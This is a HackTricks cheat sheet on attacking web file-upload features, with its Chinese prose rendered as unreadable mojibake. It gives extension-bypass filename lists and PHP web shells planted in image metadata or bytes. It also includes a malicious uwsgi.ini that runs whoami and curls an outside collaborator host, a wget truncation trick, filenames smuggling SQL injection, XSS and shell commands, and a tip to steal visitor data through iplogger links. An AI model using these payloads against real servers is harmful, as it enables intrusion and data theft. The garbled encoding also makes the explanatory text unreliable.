# æ–‡ä»¶ä¸Šä¼ 

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**æ¼æ´èµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**æ¼æ´èµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)

{% embed url="https://go.intigriti.com/hacktricks" %}

## æ–‡ä»¶ä¸Šä¼ ä¸€èˆ¬æ–¹æ³•

å…¶ä»–æœ‰ç”¨çš„æ‰©å±•åï¼š

* **PHP**ï¼š_.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **åœ¨PHPv8ä¸­å·¥ä½œ**ï¼š_.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**ï¼š_.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**ï¼š_.swf_
* **Perl**ï¼š_.pl, .cgi_
* **Erlang Yaws Web Server**ï¼š_.yaws_

### ç»•è¿‡æ–‡ä»¶æ‰©å±•åæ£€æŸ¥

1. å¦‚æœé€‚ç”¨ï¼Œ**æ£€æŸ¥****ä¹‹å‰çš„æ‰©å±•å**ã€‚è¿˜è¦ä½¿ç”¨ä¸€äº›**å¤§å†™å­—æ¯**è¿›è¡Œæµ‹è¯•ï¼š_pHp, .pHP5, .PhAr ..._
2. _åœ¨æ‰§è¡Œæ‰©å±•åä¹‹å‰**æ·»åŠ ä¸€ä¸ªæœ‰æ•ˆçš„æ‰©å±•å**è¿›è¡Œæ£€æŸ¥ï¼ˆä¹Ÿä½¿ç”¨ä¹‹å‰çš„æ‰©å±•åï¼‰ï¼š_
* _file.png.php_
* _file.png.Php5_
3. å°è¯•åœ¨æœ«å°¾æ·»åŠ **ç‰¹æ®Šå­—ç¬¦**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨Burpæ¥**æš´åŠ›ç ´è§£**æ‰€æœ‰**ascii**å’Œ**Unicode**å­—ç¬¦ã€‚ (_è¯·æ³¨æ„ï¼Œæ‚¨è¿˜å¯ä»¥å°è¯•ä½¿ç”¨**å…ˆå‰æåˆ°çš„æ‰©å±•å**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. å°è¯•ç»•è¿‡ä¿æŠ¤ï¼Œé€šè¿‡ä½¿ç”¨**åŒå€æ‰©å±•å**æˆ–åœ¨æ‰©å±•åä¹‹é—´**æ·»åŠ åƒåœ¾**æ•°æ®ï¼ˆ**ç©º**å­—èŠ‚ï¼‰ç­‰æŠ€æœ¯æ¥æ¬ºéª—æœåŠ¡å™¨ç«¯çš„æ‰©å±•åè§£æå™¨ã€‚_æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**å…ˆå‰çš„æ‰©å±•å**æ¥å‡†å¤‡æ›´å¥½çš„æœ‰æ•ˆè´Ÿè½½ã€‚_
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. åœ¨ä¹‹å‰çš„æ£€æŸ¥ä¸­æ·»åŠ **å¦ä¸€å±‚æ‰©å±•å**ï¼š
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. å°è¯•å°†**æ‰§è¡Œæ‰©å±•åæ”¾åœ¨æœ‰æ•ˆæ‰©å±•åä¹‹å‰**ï¼Œå¹¶ç¥ˆç¥·æœåŠ¡å™¨é…ç½®é”™è¯¯ã€‚ ï¼ˆç”¨äºåˆ©ç”¨Apacheé…ç½®é”™è¯¯ï¼Œå…¶ä¸­ä»»ä½•å…·æœ‰æ‰©å±•å\*\* _**.php**_**ï¼Œä½†**ä¸ä¸€å®šä»¥.phpç»“å°¾çš„å†…å®¹å°†æ‰§è¡Œä»£ç ï¼‰ï¼š
* _ä¾‹å¦‚ï¼šfile.php.png_
7. åœ¨**Windows**ä¸­ä½¿ç”¨**NTFSå¤‡ç”¨æ•°æ®æµï¼ˆADSï¼‰**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°†åœ¨ç¦æ­¢æ‰©å±•åä¹‹åå’Œå…è®¸æ‰©å±•åä¹‹å‰æ’å…¥å†’å·å­—ç¬¦â€œ:â€ã€‚ç»“æœï¼Œå°†åœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªå¸¦æœ‰ç¦æ­¢æ‰©å±•åçš„**ç©ºæ–‡ä»¶**ï¼ˆä¾‹å¦‚â€œfile.asax:.jpgâ€ï¼‰ã€‚ç¨åå¯ä»¥ä½¿ç”¨å…¶ä»–æŠ€æœ¯ï¼ˆä¾‹å¦‚ä½¿ç”¨å…¶çŸ­æ–‡ä»¶åï¼‰ç¼–è¾‘æ­¤æ–‡ä»¶ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨â€œ**::$data**â€æ¨¡å¼åˆ›å»ºéç©ºæ–‡ä»¶ã€‚å› æ­¤ï¼Œåœ¨æ­¤æ¨¡å¼åæ·»åŠ ä¸€ä¸ªç‚¹å­—ç¬¦ä¹Ÿå¯èƒ½æœ‰åŠ©äºç»•è¿‡è¿›ä¸€æ­¥çš„é™åˆ¶ï¼ˆä¾‹å¦‚â€œfile.asp::$data.â€ï¼‰
8. å°è¯•çªç ´æ–‡ä»¶åé™åˆ¶ã€‚æœ‰æ•ˆæ‰©å±•åè¢«æˆªæ–­ï¼Œæ¶æ„PHPè¢«ç•™ä¸‹ã€‚AAA<--SNIP-->AAA.php

```
# Linuxæœ€å¤§255å­—èŠ‚
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # å‡å»4å¹¶æ·»åŠ .png
# ä¸Šä¼ æ–‡ä»¶å¹¶æ£€æŸ¥å“åº”å…è®¸å¤šå°‘å­—ç¬¦ã€‚å‡è®¾ä¸º236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# åˆ¶ä½œæœ‰æ•ˆè´Ÿè½½
AAA<--SNIP 232 A-->AAA.php.png
```

### ç»•è¿‡Content-Typeã€é­”æ•°ã€å‹ç¼©å’Œè°ƒæ•´å¤§å°

* é€šè¿‡å°†**Content-Type** **å¤´**çš„**å€¼**è®¾ç½®ä¸ºï¼š_image/png_ï¼Œ_text/plain_ï¼Œ_application/octet-stream_ æ¥ç»•è¿‡**Content-Type**æ£€æŸ¥
1. Content-Type **å­—å…¸**ï¼š[https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* é€šè¿‡åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ **çœŸå®å›¾åƒçš„å­—èŠ‚**ï¼ˆæ··æ·†_file_å‘½ä»¤ï¼‰æˆ–å°†shellå¼•å…¥**å…ƒæ•°æ®**æ¥ç»•è¿‡**é­”æ•°**æ£€æŸ¥ï¼š\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` æˆ–è€…æ‚¨è¿˜å¯ä»¥ç›´æ¥åœ¨å›¾åƒä¸­**å¼•å…¥æœ‰æ•ˆè´Ÿè½½**ï¼š\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* å¦‚æœæ‚¨çš„å›¾åƒæ­£åœ¨æ·»åŠ **å‹ç¼©**ï¼Œä¾‹å¦‚ä½¿ç”¨ä¸€äº›æ ‡å‡†PHPåº“ï¼ˆå¦‚[PHP-GD](https://www.php.net/manual/fr/book.image.php)ï¼‰ï¼Œåˆ™ä¹‹å‰çš„æŠ€æœ¯å°†ä¸èµ·ä½œç”¨ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**PLTEå—** [**æ­¤å¤„å®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ¥æ’å…¥ä¸€äº›æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å°†**åœ¨å‹ç¼©åä¿ç•™**ã€‚
* [**å¸¦æœ‰ä»£ç çš„Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* ç½‘é¡µè¿˜å¯èƒ½**è°ƒæ•´**å›¾åƒå¤§å°ï¼Œä¾‹å¦‚ä½¿ç”¨PHP-GDå‡½æ•°`imagecopyresized`æˆ–`imagecopyresampled`ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**IDATå—** [**æ­¤å¤„å®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ¥æ’å…¥ä¸€äº›æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å°†**åœ¨å‹ç¼©åä¿ç•™**ã€‚
* [**å¸¦æœ‰ä»£ç çš„Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* åˆ¶ä½œä¸€ä¸ª**å¯ä»¥åœ¨å›¾åƒè°ƒæ•´å¤§å°åä¿ç•™çš„æœ‰æ•ˆè´Ÿè½½**çš„å¦ä¸€ç§æŠ€æœ¯ï¼Œä½¿ç”¨PHP-GDå‡½æ•°`thumbnailImage`ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**tEXtå—** [**æ­¤å¤„å®šä¹‰çš„æŠ€æœ¯**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) æ¥æ’å…¥ä¸€äº›æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å°†**åœ¨å‹ç¼©åä¿ç•™**ã€‚
* [**å¸¦æœ‰ä»£ç çš„Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### å…¶ä»–æ£€æŸ¥æŠ€å·§

* æŸ¥æ‰¾**é‡å‘½å**å·²ä¸Šä¼ æ–‡ä»¶çš„æ¼æ´ï¼ˆæ›´æ”¹æ‰©å±•åï¼‰ã€‚
* æŸ¥æ‰¾**æœ¬åœ°æ–‡ä»¶åŒ…å«**æ¼æ´ä»¥æ‰§è¡Œåé—¨ã€‚
* **å¯èƒ½çš„ä¿¡æ¯æ³„éœ²**ï¼š
1. **å¤šæ¬¡**ï¼ˆåŒæ—¶ï¼‰ä¸Šä¼ **ç›¸åŒåç§°**çš„**ç›¸åŒæ–‡ä»¶**
2. ä¸Šä¼ å…·æœ‰**å·²å­˜åœ¨çš„æ–‡ä»¶**æˆ–**æ–‡ä»¶å¤¹**åç§°çš„æ–‡ä»¶
3. ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œå…¶åç§°ä¸º**â€œ.â€ã€â€œ..â€æˆ–â€œâ€¦â€**ã€‚ä¾‹å¦‚ï¼Œåœ¨**Windows**çš„Apacheä¸­ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨â€œ/www/uploads/â€ç›®å½•ä¸­ï¼Œâ€œ.â€æ–‡ä»¶åå°†åœ¨â€œ/www/â€ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºâ€œuploadsâ€çš„æ–‡ä»¶ã€‚
4. åœ¨**NTFS**ä¸­ä¸Šä¼ ä¸€ä¸ªå¯èƒ½ä¸å®¹æ˜“åˆ é™¤çš„æ–‡ä»¶ï¼Œä¾‹å¦‚**â€œâ€¦:.jpgâ€**ï¼ˆWindowsï¼‰ã€‚
5. ä½¿ç”¨å…¶åç§°ä¸­çš„æ— æ•ˆå­—ç¬¦ï¼ˆå¦‚`|<>*?â€`ï¼‰åœ¨**Windows**ä¸­ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼ˆWindowsï¼‰ã€‚
6. ä½¿ç”¨ä¿ç•™ï¼ˆç¦æ­¢ï¼‰åç§°ï¼ˆå¦‚CONã€PRNã€AUXã€NULã€COM1ã€COM2ã€COM3ã€COM4ã€COM5ã€COM6ã€COM7ã€COM8ã€COM9ã€LPT1ã€LPT2ã€LPT3ã€LPT4ã€LPT5ã€LPT6ã€LPT7ã€LPT8å’ŒLPT9ï¼‰åœ¨**Windows**ä¸­ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ã€‚
* è¿˜å°è¯•**ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶**ï¼ˆ.exeï¼‰æˆ–ä¸€ä¸ª**.html**ï¼ˆä¸å¤ªå¯ç–‘ï¼‰ï¼Œå½“å—å®³è€…æ„å¤–æ‰“å¼€æ—¶**å°†æ‰§è¡Œä»£ç **ã€‚

### ç‰¹æ®Šæ‰©å±•åæŠ€å·§

å¦‚æœæ‚¨å°è¯•å°†æ–‡ä»¶ä¸Šä¼ åˆ°**PHPæœåŠ¡å™¨**ï¼Œ[æŸ¥çœ‹**.htaccess**æŠ€å·§ä»¥æ‰§è¡Œä»£ç ](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)ã€‚\
å¦‚æœæ‚¨å°è¯•å°†æ–‡ä»¶ä¸Šä¼ åˆ°**ASPæœåŠ¡å™¨**ï¼Œ[æŸ¥çœ‹**.config**æŠ€å·§ä»¥æ‰§è¡Œä»£ç ](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)ã€‚

`.phar`æ–‡ä»¶ç±»ä¼¼äºJavaçš„`.jar`ï¼Œä½†ç”¨äºPHPï¼Œå¯ä»¥åƒPHPæ–‡ä»¶ä¸€æ ·**ä½¿ç”¨**ï¼ˆä½¿ç”¨PHPæ‰§è¡Œå®ƒï¼Œæˆ–å°†å…¶åŒ…å«åœ¨è„šæœ¬ä¸­...ï¼‰

`.inc`æ‰©å±•åæœ‰æ—¶ç”¨äºä»…ç”¨äº**å¯¼å…¥æ–‡ä»¶**çš„phpæ–‡ä»¶ï¼Œå› æ­¤åœ¨æŸä¸ªæ—¶å€™ï¼ŒæŸäººå¯èƒ½å·²ç»å…è®¸**æ‰§è¡Œæ­¤æ‰©å±•å**ã€‚

## **Jetty RCE**

å¦‚æœæ‚¨å¯ä»¥å°†XMLæ–‡ä»¶ä¸Šä¼ åˆ°JettyæœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥è·å¾—[RCEï¼Œå› ä¸º**æ–°çš„\*.xmlå’Œ\*.warä¼šè‡ªåŠ¨å¤„ç†**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**ã€‚** å› æ­¤ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå°†XMLæ–‡ä»¶ä¸Šä¼ åˆ°`$JETTY_BASE/webapps/`å¹¶ç­‰å¾…shellï¼

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

æœ‰å…³æ­¤æ¼æ´çš„è¯¦ç»†æ¢è®¨ï¼Œè¯·æŸ¥çœ‹åŸå§‹ç ”ç©¶ï¼š[uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)ã€‚

å¦‚æœæœ‰èƒ½åŠ›ä¿®æ”¹`.ini`é…ç½®æ–‡ä»¶ï¼Œåˆ™å¯ä»¥åˆ©ç”¨uWSGIæœåŠ¡å™¨ä¸­çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚uWSGIé…ç½®æ–‡ä»¶åˆ©ç”¨ç‰¹å®šè¯­æ³•æ¥åŒ…å«â€œé­”æœ¯â€å˜é‡ã€å ä½ç¬¦å’Œè¿ç®—ç¬¦ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œâ€œ@â€è¿ç®—ç¬¦ï¼Œå¦‚`@(filename)`ï¼Œæ—¨åœ¨åŒ…å«æ–‡ä»¶çš„å†…å®¹ã€‚åœ¨uWSGIä¸­æ”¯æŒçš„å„ç§æ–¹æ¡ˆä¸­ï¼Œâ€œexecâ€æ–¹æ¡ˆç‰¹åˆ«å¼ºå¤§ï¼Œå…è®¸ä»è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºä¸­è¯»å–æ•°æ®ã€‚å½“å¤„ç†`.ini`é…ç½®æ–‡ä»¶æ—¶ï¼Œæ­¤åŠŸèƒ½å¯ç”¨äºæ¶æ„ç›®çš„ï¼Œä¾‹å¦‚è¿œç¨‹å‘½ä»¤æ‰§è¡Œæˆ–ä»»æ„æ–‡ä»¶å†™å…¥/è¯»å–ã€‚

è€ƒè™‘ä»¥ä¸‹æœ‰å®³çš„`uwsgi.ini`æ–‡ä»¶ç¤ºä¾‹ï¼Œå±•ç¤ºå„ç§æ–¹æ¡ˆï¼š
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
## **wget æ–‡ä»¶ä¸Šä¼ /SSRF æŠ€å·§**

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½ä¼šå‘ç°æœåŠ¡å™¨æ­£åœ¨ä½¿ç”¨ **`wget`** æ¥ **ä¸‹è½½æ–‡ä»¶**ï¼Œæ‚¨å¯ä»¥ **æŒ‡å®š** **URL**ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œä»£ç å¯èƒ½ä¼šæ£€æŸ¥ä¸‹è½½æ–‡ä»¶çš„æ‰©å±•åæ˜¯å¦åœ¨ç™½åå•å†…ï¼Œä»¥ç¡®ä¿åªæœ‰å…è®¸ä¸‹è½½çš„æ–‡ä»¶ä¼šè¢«ä¸‹è½½ã€‚ç„¶è€Œï¼Œ**è¿™ç§æ£€æŸ¥å¯ä»¥è¢«ç»•è¿‡ã€‚**\
**Linux** ä¸­ **æ–‡ä»¶å** çš„ **æœ€å¤§é•¿åº¦** æ˜¯ **255**ï¼Œä½†æ˜¯ **wget** ä¼šå°†æ–‡ä»¶åæˆªæ–­ä¸º **236** ä¸ªå­—ç¬¦ã€‚æ‚¨å¯ä»¥ **ä¸‹è½½ä¸€ä¸ªåä¸º "A"\*232+".php"+".gif"** çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åå°† **ç»•è¿‡** **æ£€æŸ¥**ï¼ˆå°±åƒåœ¨è¿™ä¸ªä¾‹å­ä¸­ **".gif"** æ˜¯ä¸€ä¸ª **æœ‰æ•ˆ** çš„æ‰©å±•åï¼‰ï¼Œä½† `wget` ä¼šå°†æ–‡ä»¶é‡å‘½åä¸º **"A"\*232+".php"**ã€‚
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
è¯·æ³¨æ„ï¼Œ**å¦ä¸€ä¸ªé€‰é¡¹**å¯èƒ½ä¼šè®©æ‚¨ç»•è¿‡æ­¤æ£€æŸ¥çš„æ–¹æ³•æ˜¯ä½¿**HTTPæœåŠ¡å™¨é‡å®šå‘åˆ°å¦ä¸€ä¸ªæ–‡ä»¶**ï¼Œå› æ­¤åˆå§‹URLå°†é€šè¿‡æ£€æŸ¥ï¼Œç„¶åwgetå°†ä½¿ç”¨æ–°åç§°ä¸‹è½½é‡å®šå‘çš„æ–‡ä»¶ã€‚è¿™**ä¸ä¼šèµ·ä½œç”¨**ï¼Œ**é™¤é**wgetä¸å‚æ•°`--trust-server-names`ä¸€èµ·ä½¿ç”¨ï¼Œå› ä¸º**wgetå°†ä½¿ç”¨åŸå§‹URLä¸­æŒ‡å®šçš„æ–‡ä»¶åç§°ä¸‹è½½é‡å®šå‘çš„é¡µé¢**ã€‚

## å·¥å…·

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©æ¸—é€æµ‹è¯•äººå‘˜å’Œæ¼æ´çŒäººæµ‹è¯•æ–‡ä»¶ä¸Šä¼ æœºåˆ¶ã€‚å®ƒåˆ©ç”¨å„ç§æ¼æ´èµé‡‘æŠ€æœ¯ç®€åŒ–äº†è¯†åˆ«å’Œåˆ©ç”¨æ¼æ´çš„è¿‡ç¨‹ï¼Œç¡®ä¿å¯¹Webåº”ç”¨ç¨‹åºè¿›è¡Œå…¨é¢è¯„ä¼°ã€‚

## ä»æ–‡ä»¶ä¸Šä¼ åˆ°å…¶ä»–æ¼æ´

* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`../../../tmp/lol.png`ï¼Œå°è¯•å®ç°**è·¯å¾„éå†**
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`sleep(10)-- -.jpg`ï¼Œå¯èƒ½ä¼šå®ç°**SQLæ³¨å…¥**
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`<svg onload=alert(document.domain)>`ä»¥å®ç°XSS
* å°†**æ–‡ä»¶å**è®¾ç½®ä¸º`; sleep 10;`ä»¥æµ‹è¯•ä¸€äº›å‘½ä»¤æ³¨å…¥ï¼ˆæ›´å¤š[å‘½ä»¤æ³¨å…¥æŠ€å·§åœ¨æ­¤å¤„](../command-injection.md)ï¼‰
* [å›¾åƒï¼ˆsvgï¼‰æ–‡ä»¶ä¸Šä¼ ä¸­çš„**XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS**æ–‡ä»¶**ä¸Šä¼ ** + **XSS** = [**Service Workers**åˆ©ç”¨](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [svgä¸Šä¼ ä¸­çš„**XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* é€šè¿‡ä¸Šä¼ svgæ–‡ä»¶å®ç°[**å¼€æ”¾é‡å®šå‘**](../open-redirect.md#open-redirect-uploading-svg-files)
* ä»[**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)å°è¯•**ä¸åŒçš„svgæœ‰æ•ˆè´Ÿè½½**
* [è‘—åçš„**ImageTrick**æ¼æ´](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* å¦‚æœæ‚¨å¯ä»¥**æŒ‡ç¤ºWebæœåŠ¡å™¨ä»URLä¸­è·å–å›¾åƒ**ï¼Œæ‚¨å¯ä»¥å°è¯•æ»¥ç”¨[SSRF](../ssrf-server-side-request-forgery/)ã€‚å¦‚æœæ­¤**å›¾åƒ**å°†è¢«**ä¿å­˜**åœ¨æŸä¸ª**å…¬å…±**ç«™ç‚¹ä¸Šï¼Œæ‚¨è¿˜å¯ä»¥æŒ‡ç¤ºURLä»[https://iplogger.org/invisible/](https://iplogger.org/invisible/)å¹¶**çªƒå–æ¯ä¸ªè®¿é—®è€…çš„ä¿¡æ¯**ã€‚
* [é€šè¿‡PDF-Adobeä¸Šä¼ **XXEå’ŒCORS**ç»•è¿‡](pdf-upload-xxe-and-cors-bypass.md)
